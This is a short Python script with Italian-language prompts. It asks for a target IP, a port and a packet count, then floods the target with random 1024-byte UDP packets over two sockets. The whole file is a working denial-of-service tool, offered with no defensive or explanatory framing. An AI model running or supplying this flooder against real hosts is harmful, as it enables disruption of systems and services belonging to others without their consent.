import socket
import random
import time

def udp_flood():
    packets = random._urandom(1024)

    for x in range(1, num + 1):
            s.sendto(packets, target)
            send_2.sendto(packets, target)
            print("#", x*2, "pacchetti inviati")
            time.sleep(random.random()*0.1)

destination = input("Inserisci l'IP di destinazione: ")
port = int(input("Inserisci la porta di destinazione: "))
num = int(input("Inserisci il numero di pacchetti da inviare:"))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    send_2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    target = (destination, port)

except Exception as e:
    print("Errore nella creazione del socket:", e)
    s.close()
    send_2.close()
    exit

udp_flood()